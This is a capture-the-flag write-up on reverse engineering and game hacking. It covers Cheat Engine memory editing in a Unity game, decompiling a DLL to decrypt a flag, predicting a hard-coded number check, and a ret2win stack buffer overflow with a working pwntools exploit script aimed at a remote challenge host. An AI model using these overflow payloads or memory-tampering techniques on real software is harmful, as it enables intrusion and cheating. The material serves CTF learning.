# Reverse Engineering & Game Hacking

## 1. Insert a Coin to Play (GTA 5 Clone)

**Target:** Unity Game

**Goal:** Collect 10 coins (Game limits to 5).

**Solution:**

This was a memory corruption challenge.

1. Used **Cheat Engine** to attach to the game process.

2. Scanned for the integer value of coins (4 bytes).

3. Collected a coin, refined the scan, and identified the memory address.

4. Modified the value to `10`. The game logic triggered and revealed the flag.

---

## 2. Insert a Coin to Play 2 (GTA 6 Clone)

**Target:** Unity Game

**Goal:** Collect 10 coins. Memory editing was patched.

**Solution:**

The hint "who dare to listen" suggests a network listener.

1. **Static Analysis:** Decompiled the game code (`Assembly-CSharp.dll`) using **dnSpy**.

2. **Code Review:** Found the `GameManager` class. The "listening" part was a metaphor for a decryption function.

3. **Decrypt:** Found the encrypted flag string `jldkgssdglkjsdlkj` and the logic (subtract 5 from ASCII value of each char).

4. Wrote a Python script to decrypt the string:

    ```python
    encrypted = "jldkgssdglkjsdlkj"
    flag = ''.join(chr(ord(c) - 5) for c in encrypted)
    print(flag)
    ```

**Flag:** `UVT{Wh4t?!...}`

---

## 3. Random

**Target:** Linux Shared Library (`.x-sharedlib`) and Remote Service.

**Solution:**

1. **Analysis:** Ran the binary locally; it asked for a number.

2. **Tracing:** Used `ltrace ./main.x-sharedlib` to intercept library calls.

    - Observed `srand(time(0))`: The random seed was based on the current timestamp (Predictable PRNG).

3. **Disassembly:** Used `objdump -d -M intel` to inspect the code.

    ```bash
    objdump -d -M intel main.x-sharedlib
    ```

    - Found a comparison: `cmp eax, 0x539`.
    - `0x539` in hex = **1337** in decimal.

4. **Exploit:** Connected to the server and sent `1337`.

**Flag:** `flag{l33t_m3...}`


## 4. BOF (Buffer Overflow)
**Target:** Linux Executable (`bof.x-executable`) & Remote Service
**Vulnerability:** Stack Buffer Overflow (Ret2Win)

**Solution:**
The challenge provided a binary and a netcat instance.
1.  **Initial Fuzzing:** tried sending a long string (`python3 -c "print('A' * 100)" | nc ...`) to crash the service. The connection closed immediately, suggesting a crash.
2.  **Static Analysis:** I needed a target address to jump to. I used `nm` to look for interesting functions:
    ```bash
    nm bof.x-executable | grep -i "flag"
    ```
    Result: `0000000000400767 T flag`. This is the address of the function that prints the flag.
3.  **Dynamic Analysis (Finding Offset):**
    - Started the binary in **GDB**: `gdb ./bof.x-executable`.
    - Generated a cyclic pattern using a Python script to identify the exact crash point.
    - Crashed the app and inspected the **RSP** register: `0x6264616161646161`.
    - Calculated the offset by finding the position of that hex value in the pattern.
    - **Offset found:** 312.
4.  **Exploitation:**
    I wrote a Python script using `pwntools` to send 312 'A's followed by the address of the `flag` function (`0x400767`).
5.  **The Stack Alignment Issue:**
    The initial exploit failed (EOF). I realized this was due to the **Stack Alignment** rule (System V AMD64 ABI requires 16-byte alignment when calling functions like `printf`). Jumping to the start of the function (`push rbp`) misaligned the stack.
    * **Fix:** I added `+1` to the target address (`0x400768`) to skip the function prologue (`push rbp`). This kept the stack aligned.

**Exploit Code:**
```python
from pwn import *

target_host = "34.40.9.88"
target_port = 32659
offset = 312
# Skip prologue for stack alignment (+1)
flag_function_addr = 0x400767 + 1 

conn = remote(target_host, target_port)

payload = b"A" * offset
payload += p64(flag_function_addr)

print(conn.recv())
conn.sendline(payload)
print(conn.recvall().decode())